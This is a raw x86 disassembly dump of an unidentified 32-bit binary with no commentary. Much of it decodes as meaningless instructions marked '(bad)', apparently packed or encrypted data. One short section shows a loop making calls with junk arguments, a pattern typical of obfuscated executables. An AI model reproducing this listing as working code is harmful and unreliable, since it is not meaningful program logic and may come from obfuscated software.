  40483d:	imul   ebp,DWORD PTR [ebx-0x430223f2],0xffffff80
  404844:	pop    edx
  404845:	lods   eax,DWORD PTR ds:[esi]
  404846:	jp     0x4048bd
  404848:	jns    0x404844
  40484a:	addr16 xor esp,edx
  40484d:	mov    esi,0x3f8ce31f
  404852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404853:	stos   BYTE PTR es:[edi],al
  404854:	mul    DWORD PTR [ebx]
  404856:	(bad)  
  404857:	ins    DWORD PTR es:[edi],dx
  404858:	dec    edx
  404859:	shl    BYTE PTR [ebx],0xa3
  40485c:	lock test BYTE PTR [ebx+0x32f974c],ch
  404863:	and    DWORD PTR [edi+0x5f],ecx
  404866:	rcr    dl,1
  404868:	jnp    0x404809
  40486a:	adc    ebp,DWORD PTR [esi+0x66495b55]
  404870:	xor    bl,BYTE PTR [esi]
  404872:	or     eax,0xc7b1f30a
  404877:	cmp    DWORD PTR [ecx-0x2c7d7ee4],ebx
  40487d:	aas    
  40487e:	ret    0x330e
  404881:	leave  
  404882:	mov    ah,0xcd
  404884:	or     BYTE PTR [edx+0x2f8d3e2a],ah
  40488a:	adc    eax,0xdad92de9
  40488f:	(bad)  
  404890:	and    DWORD PTR [esi+0x4a],esp
  404893:	adc    eax,0x36382d57
  404898:	jmp    0x2d7d7de4
  40489d:	mov    ebx,0x3709ec10
  4048a2:	or     bl,ch
  4048a4:	mov    DWORD PTR [esp+ecx*4-0x72],esi
  4048a8:	cmp    eax,0x135d0380
  4048ad:	pop    esi
  4048ae:	pop    es
  4048af:	jecxz  0x40485a
  4048b1:	cdq    
  4048b2:	shl    BYTE PTR [eax-0x2d6a0400],cl
  4048b8:	sti    
  4048b9:	bound  esi,QWORD PTR [ebx]
  4048bb:	ins    DWORD PTR es:[edi],dx
  4048bc:	and    dl,BYTE PTR [eax-0x3a]
  4048bf:	daa    
  4048c0:	mov    ah,0x9b
  4048c2:	or     BYTE PTR [ecx-0x34d34921],dh
  4048c8:	adc    esp,esp
  4048ca:	sti    
  4048cb:	pop    es
  4048cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048cd:	jp     0x4048f3
  4048cf:	jne    0x404940
  4048d1:	repnz test ebp,ebp
  4048d4:	(bad)  
  4048d5:	test   eax,0x86e3aee2
  4048da:	out    0x54,eax
  4048dc:	sbb    DWORD PTR [edi],ebp
  4048de:	test   ch,bh
  4048e0:	mov    ds:0xebcef218,eax
  4048e5:	ins    BYTE PTR es:[edi],dx
  4048e6:	test   eax,0x76291ca8
  4048eb:	mov    edx,0xb77fbe22
  4048f0:	jo     0x404928
  4048f2:	mov    bh,0x58
  4048f4:	mov    ebp,0x8da0a886
  4048f9:	fld    TBYTE PTR [ecx]
  4048fb:	mov    DWORD PTR [esi-0x2ce907e],0x14ba62fa
  404905:	mov    cl,0x8d
  404907:	mov    DWORD PTR [edi-0x4e],ebp
  40490a:	das    
  40490b:	mov    edi,0xe4d99447
  404910:	sub    al,0xfe
  404912:	push   ecx
  404913:	sub    eax,0x1a5f9682
  404918:	push   ds
  404919:	gs test al,0x98
  40491c:	and    eax,esp
  40491e:	mov    al,0x98
  404920:	or     bh,dl
  404922:	in     eax,dx
  404923:	mov    ds,WORD PTR [ebp+0xa]
  404926:	jp     0x4048d1
  404928:	ret    0x6b4f
  40492b:	xor    esp,DWORD PTR fs:[ebp+0x4d]
  40492f:	lea    ebp,[edi-0x9bfd2bd]
  404935:	retf   
  404936:	inc    ecx
  404937:	sbb    al,0x8a
  404939:	push   edi
  40493a:	aaa    
  40493b:	sahf   
  40493c:	push   ebp
  40493d:	mov    bh,0x5a
  40493f:	ret    0xa2f6
  404942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404943:	fstp   DWORD PTR [edi]
  404945:	adc    al,0xc2
  404947:	daa    
  404948:	int    0xf2
  40494a:	xchg   esi,eax
  40494b:	mov    bl,0x30
  40494d:	sbb    BYTE PTR [ebx+0x5f],0xe4
  404951:	pushf  
  404952:	jbe    0x40493e
  404954:	push   ss
  404955:	lea    edx,[edi+0x3e580d49]
  40495b:	mov    ds:0xcd647edf,al
  404960:	and    BYTE PTR [eax+0x7],cl
  404963:	lds    eax,FWORD PTR [ecx+0x5a]
  404966:	out    dx,eax
  404967:	jo     0x404942
  404969:	xor    DWORD PTR [esi-0x3b],esi
  40496c:	popa   
  40496d:	(bad)
  404970:	or     BYTE PTR [edi-0x3a],bh
  404973:	xor    bh,bl
  404975:	cmp    bh,dl
  404977:	mov    esp,0x389df65e
  40497c:	pop    ss
  40497d:	jmp    0xa598fe20
  404982:	sub    dl,BYTE PTR [ecx-0x6f]
  404985:	inc    esp
  404986:	(bad)  
  404987:	ror    BYTE PTR [edx-0x36869dcc],1
  40498d:	out    dx,al
  40498e:	mov    edi,0xcf2d5b5a
  404993:	in     eax,dx
  404994:	pop    esp
  404995:	mov    edi,0x8bfb3e39
  40499a:	retf   0x8d14
  40499d:	and    dl,BYTE PTR [ecx+0x35]
  4049a0:	sub    al,0x8f
  4049a2:	ret    0x2c23
  4049a5:	pop    ds
  4049a6:	icebp  
  4049a7:	ret    0xbccb
  4049aa:	ja     0x4049d8
  4049ac:	or     BYTE PTR [edx-0x71889192],ah
  4049b2:	push   es
  4049b3:	sahf   
  4049b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049b5:	lds    ebp,FWORD PTR [esi]
  4049b7:	ret    
  4049b8:	cmp    eax,0xc835984b
  4049bd:	adc    al,BYTE PTR [edx+0x2a591aef]
  4049c3:	adc    bl,dl
  4049c5:	loop   0x404a06
  4049c7:	sar    BYTE PTR [esi],0xa5
  4049ca:	or     esp,DWORD PTR [edx+0x13]
  4049cd:	mov    WORD PTR [esi+0x14d9e6d6],gs
  4049d3:	jg     0x4049d4
  4049d5:	std    
  4049d6:	or     esi,ebx
  4049d8:	jmp    0xda98:0x7ccc0847
  4049df:	fist   DWORD PTR [esi]
  4049e1:	rcr    DWORD PTR [eax+0x44df11a],cl
  4049e7:	xchg   ebp,eax
  4049e8:	jbe    0x4049e1
  4049ea:	icebp  
  4049eb:	out    0xf9,eax
  4049ed:	pop    edx
  4049ee:	popf   
  4049ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049f0:	push   ecx
  4049f1:	inc    ebx
  4049f2:	sahf   
  4049f3:	arpl   WORD PTR [edi+edi*2+0x7d],bx
  4049f7:	and    ah,BYTE PTR [ebx+0x18063155]
  4049fd:	push   esp
  4049fe:	out    dx,eax
  4049ff:	mov    esi,0x9365bec
  404a04:	dec    eax
  404a05:	retf   
  404a06:	sub    al,0xb3
  404a08:	lea    edi,[ebp+0x29]
  404a0b:	fadd   DWORD PTR [esi]
  404a0d:	dec    esp
  404a0e:	dec    ecx
  404a0f:	mov    cl,0xe0
  404a11:	xchg   ebx,eax
  404a12:	jo     0x404a37
  404a14:	add    edx,DWORD PTR [ebx-0x25]
  404a17:	sar    DWORD PTR [edi+0x31edd7c6],0x6d
  404a1e:	push   ss
  404a1f:	or     al,BYTE PTR ds:[edi+0x63]
  404a23:	nop
  404a24:	add    eax,0xb63b8e6f
  404a29:	jne    0x4049f8
  404a2b:	push   esi
  404a2c:	dec    eax
  404a2d:	xor    BYTE PTR [esi+0x4c658006],cl
  404a33:	push   eax
  404a34:	sub    BYTE PTR [ebx+0x6353b788],cl
  404a3a:	out    dx,al
  404a3b:	rol    BYTE PTR [ecx+0x65],1
  404a3e:	test   al,0x47
  404a40:	push   edx
  404a41:	sbb    ah,BYTE PTR [ebx+0x235e0a29]
  404a47:	loop   0x4049cc
  404a49:	cmc    
  404a4a:	test   DWORD PTR [ebx+0x850b936],edx
  404a50:	push   ecx
  404a51:	pop    es
  404a52:	and    DWORD PTR ds:0x42a839,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42a839
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42a839,esi
  404a69:	cmp    DWORD PTR ds:0x42a839,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42a839,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42a839
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42a839,esi
  404ab7:	cmp    DWORD PTR ds:0x42a839,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42a7fd
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	cs push eax
  404ae4:	sbb    ebx,edx
  404ae6:	inc    esi
  404ae7:	cs js  0x404b62
  404aea:	dec    ebp
  404aeb:	jle    0x404b65
  404aed:	js     0x404ab1
  404aef:	xor    al,0xaf
  404af1:	xor    eax,0xddf2e868
  404af6:	or     ah,bl
  404af8:	cmp    eax,0xf080405a
  404afd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404afe:	je     0x404a98
  404b00:	sbb    DWORD PTR [edx-0x167be2bf],ebp
  404b06:	out    dx,eax
  404b07:	xlat   BYTE PTR ds:[ebx]
  404b08:	sbb    DWORD PTR [edi],esi
  404b0a:	scas   eax,DWORD PTR es:[edi]
  404b0b:	inc    esp
  404b0c:	and    eax,0x54f6bc82
  404b11:	mov    edx,0x4fdb4cfa
  404b16:	and    DWORD PTR [eax+0x55],ecx
  404b19:	sub    dh,BYTE PTR [ebx]
  404b1b:	fisub  DWORD PTR [ecx]
  404b1d:	pop    es
  404b1e:	sti    
  404b1f:	mov    cl,0x6f
  404b21:	sbb    DWORD PTR [esi],ebp
  404b23:	xchg   esi,eax
  404b24:	sahf   
  404b25:	jns    0x404b5e
  404b27:	or     eax,0xa7b27
  404b2c:	popa   
  404b2d:	or     BYTE PTR [esi+0x2688a087],dh
  404b33:	push   ss
  404b34:	mov    al,0x5a
  404b36:	mov    ebp,0xf8b42be4
  404b3b:	arpl   WORD PTR [eax-0x40],si
  404b3e:	lods   eax,DWORD PTR ds:[esi]
  404b3f:	out    dx,al
  404b40:	jno    0x404ba3
  404b42:	xlat   BYTE PTR ds:[ebx]
  404b43:	jns    0x404b50
  404b45:	fucomp st(5)
  404b47:	fidivr WORD PTR [esp+edi*8+0x54]
  404b4b:	xor    ah,BYTE PTR [edx-0x21842206]
  404b51:	push   cs
  404b52:	mov    dh,0xd
  404b54:	mov    eax,ds:0x40d8d2ba
  404b59:	shr    cl,cl
  404b5b:	sbb    DWORD PTR [eax],ebx
  404b5d:	ret    
  404b5e:	fsub   DWORD PTR [edx]
  404b60:	shl    DWORD PTR [ebx-0x5a],cl
  404b63:	retf   0x26dd
  404b66:	pop    ss
  404b67:	stos   BYTE PTR es:[edi],al
  404b68:	addr16 xchg ebx,eax
  404b6a:	jae    0x404b44
  404b6c:	sub    DWORD PTR [ebx+edi*4+0x10da093c],esp
  404b73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b74:	cli    
  404b75:	mov    al,0xdd
  404b77:	pop    es
  404b78:	push   edi
  404b79:	xor    esi,DWORD PTR [eax-0x4c7b9eba]
  404b7f:	ret    
  404b80:	pushf  
  404b81:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  404b83:	mov    ecx,0x146bb0e3
  404b88:	jb     0x404b5a
  404b8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b8b:	xor    eax,0xe060c74
  404b90:	fdiv   DWORD PTR [esi+edi*1]
  404b93:	cld    
  404b94:	mov    al,0x55
  404b96:	xchg   ecx,eax
  404b97:	sbb    dh,BYTE PTR [edi]
  404b99:	lods   al,BYTE PTR ds:[esi]
  404b9a:	fsub   QWORD PTR [edx+0x27]
  404b9d:	iret   
  404b9e:	fstp   DWORD PTR [edi]
  404ba0:	pop    esi
  404ba1:	xchg   ebx,eax
  404ba2:	lea    edi,[eax]
  404ba4:	mov    al,0x88
  404ba6:	cmp    eax,0xcfb68b37
  404bab:	leave  
  404bac:	lods   al,BYTE PTR ds:[esi]
  404bad:	and    al,dl
  404baf:	xchg   edx,ebx
  404bb1:	sbb    eax,0xd4d41f6b
  404bb6:	out    0xd8,eax
  404bb8:	imul   BYTE PTR [ebx+0x3a8c1225]
  404bbe:	test   DWORD PTR ds:0xb64f61a8,ebp
  404bc4:	xor    eax,0x637742f6
  404bc9:	push   esi
  404bca:	dec    esp
  404bcb:	pop    eax
  404bcc:	sub    BYTE PTR [edi+0x70f2d4b8],0x5
  404bd3:	push   0x31
  404bd5:	inc    ecx
  404bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bd7:	add    ch,BYTE PTR [esi-0x25b155a4]
  404bdd:	mov    bh,0x9b
  404bdf:	popf   
  404be0:	and    BYTE PTR [ebp-0x27],al
  404be3:	sub    BYTE PTR [ecx+0x1096c6c4],dl
  404be9:	imul   ebp,ebp,0x27
  404bec:	or     esp,ebp
  404bee:	das    
  404bef:	xchg   esp,eax
  404bf0:	inc    esp
  404bf1:	cli    
  404bf2:	movd   DWORD PTR [ebp-0x33],mm3
  404bf6:	cld    
  404bf7:	test   eax,esi
  404bf9:	loopne 0x404c24
  404bfb:	dec    esi
  404bfc:	jnp    0x404c14
  404bfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bff:	and    ax,0xa9b5
  404c03:	sub    BYTE PTR [ecx+0x3e79b568],dh
  404c09:	sbb    DWORD PTR [edx],edi
  404c0b:	mov    ah,0xb4
  404c0d:	pop    esi
  404c0e:	inc    edx
  404c0f:	mov    dl,BYTE PTR [esi*4-0x3de57787]
  404c16:	loop   0x404c2e
  404c18:	(bad)  
  404c19:	fisubr DWORD PTR [ebx+0x5d63612f]
  404c1f:	retf   0x7882
  404c22:	cs pop esi
  404c24:	pop    es
  404c25:	and    DWORD PTR ds:0xae932ac7,ebp
  404c2b:	jp     0x404c7a
  404c2d:	dec    ecx
  404c2e:	xbegin 0xd2291134
  404c34:	add    BYTE PTR [edx],ah
  404c36:	pop    es
  404c37:	cmp    eax,0x8d3429a7
  404c3c:	xor    eax,0x7db1297e
  404c41:	inc    ebp
  404c42:	xchg   BYTE PTR [ebx+esi*2-0x4a79a4a0],ah
  404c49:	jae    0x404c24
  404c4b:	sbb    BYTE PTR [ebx+edi*1],bl
  404c4e:	das    
  404c4f:	adc    al,0x3a
  404c51:	lds    edi,FWORD PTR [ebx]
  404c53:	push   edx
  404c54:	pop    esi
  404c55:	pop    ebp
  404c56:	and    dl,BYTE PTR [esi+esi*1]
  404c59:	xchg   edx,eax
  404c5a:	or     ah,BYTE PTR [esi-0x270f4928]
  404c60:	clc    
  404c61:	xchg   ebp,eax
  404c62:	add    esp,ebp
  404c64:	inc    edi
  404c65:	cmp    edx,0x4c
  404c68:	xchg   esi,eax
  404c69:	(bad)  
  404c6a:	mov    ah,0x4a
  404c6c:	rol    bh,0x16
  404c6f:	cli    
  404c70:	push   ds
  404c71:	inc    eax
  404c72:	(bad)  ss:[edi]
  404c75:	mov    cs,WORD PTR [ecx]
  404c77:	ficom  WORD PTR [esi-0x74]
  404c7a:	push   esp
  404c7b:	int3   
  404c7c:	call   0xc3bf32b6
  404c81:	inc    ecx
  404c82:	adc    dh,BYTE PTR [edx+0x78477c64]
  404c88:	pop    ecx
  404c89:	iret   
  404c8a:	mov    ebx,0xd8b7c50f
  404c8f:	dec    ebx
  404c90:	inc    esp
  404c91:	int3   
  404c92:	mov    ds,eax
  404c94:	or     edi,DWORD PTR [ecx]
  404c96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c97:	pop    ss
  404c98:	cmp    al,BYTE PTR [esp+ecx*8+0x1d1f11a6]
  404c9f:	mov    dh,0x11
  404ca1:	jno    0x404d0a
  404ca3:	pop    ss
  404ca4:	fcomp  st(2)
  404ca6:	out    dx,al
  404ca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ca8:	cmp    esi,ebp
  404caa:	das    
  404cab:	add    ebp,DWORD PTR [eax-0x6dbcbdb7]
  404cb1:	or     eax,0xdc9c8b6e
  404cb6:	lods   eax,DWORD PTR ds:[esi]
  404cb7:	test   al,0x7b
  404cb9:	adc    DWORD PTR [ebx-0x40],esp
  404cbc:	or     ch,ah
  404cbe:	add    al,0x18
  404cc0:	mov    dh,0x14
  404cc2:	mov    ds:0xa672f4ca,eax
  404cc7:	or     esi,DWORD PTR [edi+0x75]
  404cca:	sub    BYTE PTR [ebx+0x58],bl
  404ccd:	cmp    bl,dh
  404ccf:	cmp    DWORD PTR [ecx+eiz*1+0x63],eax
  404cd3:	outs   dx,BYTE PTR ds:[esi]
  404cd4:	lods   eax,DWORD PTR ds:[esi]
  404cd5:	jbe    0x404c68
  404cd7:	xchg   edx,eax
  404cd8:	jno    0x404d48
  404cda:	inc    esi
  404cdb:	adc    DWORD PTR [esi-0x246cd093],esi
  404ce1:	(bad)  
  404ce2:	out    0xe6,eax
  404ce4:	sub    al,0xc9
  404ce6:	mov    WORD PTR [ebx+0x5daa093b],ds
  404cec:	xor    al,0x8e
  404cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cef:	adc    ecx,DWORD PTR [ebx+0x51137d07]
  404cf5:	cld    
  404cf6:	xchg   esi,eax
  404cf7:	mov    bl,0x0
  404cf9:	out    dx,al
  404cfa:	mov    ebp,DWORD PTR ds:0x6239e1ae
  404d00:	(bad)  
  404d01:	fidivr WORD PTR [eax]
  404d03:	xlat   BYTE PTR ds:[ebx]
  404d04:	mov    ?,WORD PTR [esi+edx*2]
  404d07:	adc    dh,BYTE PTR [edi-0x54]
  404d0a:	fcomp  DWORD PTR [eax]
  404d0c:	add    eax,0xd44aaffa
  404d11:	xor    BYTE PTR [edx],dl
  404d13:	sahf   
  404d14:	rol    DWORD PTR [ebx-0x7861f471],1
  404d1a:	dec    ebp
  404d1b:	fidivr WORD PTR [edi-0x68]
  404d1e:	stos   BYTE PTR es:[edi],al
  404d1f:	test   DWORD PTR [eax],esp
  404d21:	pop    esp
  404d22:	popf   
  404d23:	pop    ds
  404d24:	lods   eax,DWORD PTR ds:[esi]
  404d25:	mov    DWORD PTR [ebx+0x61],ecx
  404d28:	scas   al,BYTE PTR es:[edi]
  404d29:	xor    eax,0x71d1f62e
  404d2e:	hlt    
  404d2f:	out    dx,al
  404d30:	and    dh,BYTE PTR [ebx+0x6e4097a7]
  404d36:	inc    ebx
  404d37:	jns    0x404ce5
  404d39:	cli    
  404d3a:	hlt    
  404d3b:	dec    ecx
  404d3c:	lods   eax,DWORD PTR ds:[esi]
  404d3d:	sbb    eax,0x12facaf7
  404d42:	(bad)  
  404d43:	jb     0x404d11
  404d45:	mov    esp,0x14a4e143
  404d4a:	cwde   
  404d4b:	xchg   edi,eax
  404d4c:	repz mov dl,0x7b
  404d4f:	mov    al,0xf5
  404d51:	add    al,0xd
  404d53:	cli    
  404d54:	adc    dh,BYTE PTR [eax+0x22127f52]
  404d5a:	fdivr  DWORD PTR [ebx-0xd]
  404d5d:	dec    esi
  404d5e:	rcl    dh,1
  404d60:	mov    al,ss:0x5bdc53f7
  404d66:	idiv   dl
  404d68:	or     edi,DWORD PTR [edi+0x647f842]
  404d6e:	mov    esp,0x984193bc
  404d73:	pop    edi
  404d74:	(bad)  
  404d75:	rcl    DWORD PTR [ebp-0x77],cl
  404d78:	iret   
  404d79:	or     DWORD PTR [esi-0x24],edx
  404d7c:	icebp  
  404d7d:	test   al,0x50
  404d7f:	add    DWORD PTR [eax+eiz*8],ebx
  404d82:	fld    DWORD PTR [ebp-0x14]
  404d85:	and    BYTE PTR [edx-0x6c],ch
  404d88:	mov    ah,BYTE PTR [eax+eiz*1+0x4]
  404d8c:	cmp    DWORD PTR [ecx+0x602c250a],esi
  404d92:	and    BYTE PTR [esi-0x50681041],0x6f
  404d99:	inc    ebx
  404d9a:	inc    ecx
  404d9b:	lahf   
  404d9c:	sub    al,0x1d
  404d9e:	and    DWORD PTR ds:0x4afe4879,ecx
  404da4:	xchg   ecx,eax
  404da5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404da6:	add    DWORD PTR [eax+ebx*4-0x793dd994],eax
  404dad:	scas   eax,DWORD PTR es:[edi]
  404dae:	sub    DWORD PTR [edx+0x62],esi
  404db1:	sbb    ebp,eax
  404db3:	fsub   QWORD PTR [ebp+eiz*8-0x7734062]
  404dba:	jne    0x404db9
  404dbc:	mov    ebp,0x22ecc20d
  404dc1:	push   edi
  404dc2:	mov    edi,DWORD PTR [ebp+0x10]
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	xchg   ebx,eax
  404de9:	xchg   esi,eax
  404dea:	adc    ah,BYTE PTR ds:0x7878339b
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404e0b
  404df5:	fbstp  TBYTE PTR [edi-0x6e]
  404df8:	jbe    0x404e5e
  404dfa:	lahf   
  404dfb:	inc    esp
  404dfc:	in     eax,0x96
  404dfe:	inc    ebx
  404dff:	inc    eax
  404e00:	(bad)  
  404e01:	push   edi
  404e02:	push   ss
  404e03:	jmp    0xc0111539
  404e08:	sub    BYTE PTR [ebx-0x551c2526],ch
  404e0e:	jge    0x404e7a
  404e10:	dec    esp
  404e11:	pop    ebx
  404e12:	and    bh,cl
  404e14:	in     al,0x4c
  404e16:	or     ebx,edi
  404e18:	stc    
  404e19:	add    eax,0x2cc466ef
  404e1e:	add    ebx,edi
  404e20:	push   es
  404e21:	sbb    ebx,DWORD PTR [ebx-0x54]
  404e24:	add    dh,bh
  404e26:	pop    eax
  404e27:	idiv   DWORD PTR [ecx]
  404e29:	repz inc BYTE PTR [eax]
  404e2c:	jg     0x404ddb
  404e2e:	shl    bh,1
  404e30:	push   eax
  404e31:	mov    al,0xaf
  404e33:	xchg   esi,eax
  404e34:	repnz (bad) 
  404e37:	retf   
  404e38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e39:	ss pop esi
  404e3b:	pop    es
  404e3c:	out    dx,al
  404e3d:	repz aam 0x3e
  404e40:	into   
  404e41:	fs cmp eax,0xf3051039
  404e47:	jl     0x404de4
  404e49:	das    
  404e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e4c:	mov    eax,0x753c8b03
  404e51:	cmp    DWORD PTR [edi-0x79],ebp
  404e54:	nop
  404e55:	mov    dl,0x2a
  404e57:	aaa    
  404e58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e59:	sub    dh,BYTE PTR [eax+0x24f9deb5]
  404e5f:	loopne 0x404eaf
  404e61:	fistp  DWORD PTR [eax+0x60]
  404e64:	mov    WORD PTR [esp+edi*1-0x106c49bd],fs
  404e6b:	out    0xdd,al
  404e6d:	(bad)  [edx-0x7f028116]
  404e73:	fild   QWORD PTR [ecx]
  404e75:	or     al,0x6a
  404e77:	ins    BYTE PTR es:[edi],dx
  404e78:	push   esi
  404e79:	ret    0x404c
  404e7c:	daa    
  404e7d:	aaa    
  404e7e:	jo     0x404ee9
  404e80:	js     0x404e0c
  404e82:	scas   al,BYTE PTR es:[edi]
  404e83:	das    
  404e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e85:	jo     0x404e3b
  404e87:	enter  0xbae8,0x55
  404e8b:	jecxz  0x404f0b
  404e8d:	sub    edx,DWORD PTR [ebx+0x2b625668]
  404e93:	push   es
  404e94:	or     BYTE PTR [edx-0x56c74b91],cl
  404e9a:	sti    
  404e9b:	pop    ebp
  404e9c:	pop    ecx
  404e9d:	mov    al,BYTE PTR [edi]
  404e9f:	ret    0x81b0
  404ea2:	nop
  404ea3:	enter  0xf309,0x5f
  404ea7:	xchg   ebx,eax
  404ea8:	enter  0x5b23,0x99
  404eac:	scas   al,BYTE PTR es:[edi]
  404ead:	rcr    BYTE PTR [edx+ebx*1-0x66],cl
  404eb1:	ss push 0xea3dd36e
  404eb7:	bound  ecx,QWORD PTR [ebp+0x230323fc]
  404ebd:	or     BYTE PTR [eax+eax*8],bl
  404ec0:	push   es
  404ec1:	and    eax,0x5cf184eb
  404ec6:	lods   eax,DWORD PTR gs:[esi]
  404ec8:	inc    edi
  404ec9:	mov    ds:0xa3edc60f,al
  404ece:	rcl    esp,cl
  404ed0:	push   ebp
  404ed1:	cmp    esp,DWORD PTR [esi-0x24cf9b60]
  404ed7:	xor    ah,bh
  404ed9:	xchg   ebp,eax
  404eda:	adc    eax,0x1567222c
  404edf:	push   0x94be0f57
  404ee4:	mov    ch,0x4a
  404ee6:	rcr    BYTE PTR [ebp+0x49],1
  404ee9:	mov    dl,0xd0
  404eeb:	dec    ecx
  404eec:	xor    esp,DWORD PTR [esi]
  404eee:	les    ebx,FWORD PTR [ebx+0x456f75f6]
  404ef4:	sub    al,0x6a
  404ef6:	daa    
  404ef7:	stos   DWORD PTR es:[edi],eax
  404ef8:	fist   WORD PTR [ecx+esi*1]
  404efb:	mov    BYTE PTR [edi],al
  404efd:	and    dh,dl
  404eff:	add    eax,DWORD PTR [eax+0x75b900c4]
  404f05:	push   ebx
  404f06:	pop    eax
  404f07:	sbb    BYTE PTR [edx+edx*1-0x31d84d91],ah
  404f0e:	mov    BYTE PTR [eax-0xa1773a8],bh
  404f14:	push   esp
  404f15:	push   edx
  404f16:	xchg   edx,eax
  404f17:	sbb    al,0x8c
  404f19:	daa    
  404f1a:	addr16 dec edx
  404f1c:	arpl   WORD PTR [ecx+0x104da17c],di
  404f22:	sub    eax,0x1d3e8aab
  404f27:	sbb    al,0xbd
  404f29:	dec    eax
  404f2a:	add    BYTE PTR [ecx-0x30b579a7],al
  404f30:	xor    DWORD PTR [ecx-0x3c703822],edi
  404f36:	mov    cs,WORD PTR [edi]
  404f38:	inc    ecx
  404f39:	ins    DWORD PTR es:[edi],dx
  404f3a:	ret    
  404f3b:	dec    ecx
  404f3c:	je     0x404f22
  404f3e:	jbe    0x404ecb
  404f40:	nop
  404f41:	cdq    
  404f42:	dec    edi
  404f43:	rcr    ecx,0x70
  404f46:	wbinvd 
  404f48:	bound  eax,QWORD PTR [ebp+0x218bb49a]
  404f4e:	test   DWORD PTR [edx+0xe],0x673ee50c
  404f55:	idiv   DWORD PTR [ebx-0x2cbec295]
  404f5b:	and    DWORD PTR ss:[esi],esp
  404f5e:	loop   0x404ef8
  404f60:	fwait
  404f61:	or     bl,BYTE PTR [edi]
  404f63:	arpl   WORD PTR [eax+esi*2-0x7722e952],dx
  404f6a:	aas    
  404f6b:	loopne 0x404fce
  404f6d:	mov    ds:0x85833899,al
  404f72:	hlt    
  404f73:	pusha  
  404f74:	shl    cl,cl
  404f76:	mov    bl,BYTE PTR [ecx]
  404f78:	jb     0x404fb6
  404f7a:	test   ch,bh
  404f7c:	pop    ecx
  404f7d:	sbb    dh,BYTE PTR fs:[esi]
  404f80:	cmp    BYTE PTR [ecx+ecx*2+0x7c],ch
  404f84:	xchg   edx,eax
  404f85:	push   ds
  404f86:	aam    0x68
  404f88:	mov    bl,0x92
  404f8a:	bound  esp,QWORD PTR [edx+0x40]
  404f8d:	icebp  
  404f8e:	into   
  404f8f:	push   ebx
  404f90:	cmp    DWORD PTR [edx+0x12],edi
  404f93:	or     eax,0x5568306d
  404f98:	fist   DWORD PTR [edx]
  404f9a:	sub    DWORD PTR [ebp+0x429dda30],0x36e58185
  404fa4:	das    
  404fa5:	shr    DWORD PTR [ebp-0x7cdd08cd],1
  404fab:	add    BYTE PTR [ebx+0x4],bl
  404fae:	sub    BYTE PTR [ecx],bh
  404fb0:	cmc    
  404fb1:	iret   
  404fb2:	mov    edi,0xf1d038b7
  404fb7:	fiadd  DWORD PTR ds:0xe657a4e9
  404fbd:	std    
  404fbe:	and    al,0xe6
  404fc0:	jb     0x40502e
  404fc2:	loopne 0x40502b
  404fc4:	test   eax,0x41a17805
  404fc9:	push   ebx
  404fca:	jnp    0x405041
  404fcc:	(bad)  [ebx-0x5a9bc41d]
  404fd2:	lods   eax,DWORD PTR ds:[esi]
  404fd3:	outs   dx,BYTE PTR ds:[esi]
  404fd4:	and    DWORD PTR [ebp+0x4b],edi
  404fd7:	xchg   esi,ebp
  404fd9:	inc    ebp
  404fda:	pop    ss
  404fdb:	pop    ecx
  404fdc:	popf   
  404fdd:	je     0x404fa4
  404fdf:	mov    ds:0x97b6b967,al
  404fe4:	sbb    bl,BYTE PTR [edi-0x7c]
  404fe7:	sbb    eax,DWORD PTR [edi]
  404fe9:	push   ecx
  404fea:	rcl    BYTE PTR [edx-0x21a28d53],1
  404ff0:	and    BYTE PTR [ebx+0x44],bl
  404ff3:	(bad)  
  404ff4:	xor    eax,0x1f2deea9
  404ff9:	cmp    eax,0x9761c891
  404ffe:	(bad)  
  404fff:	enter  0xf0e8,0x70
  405003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
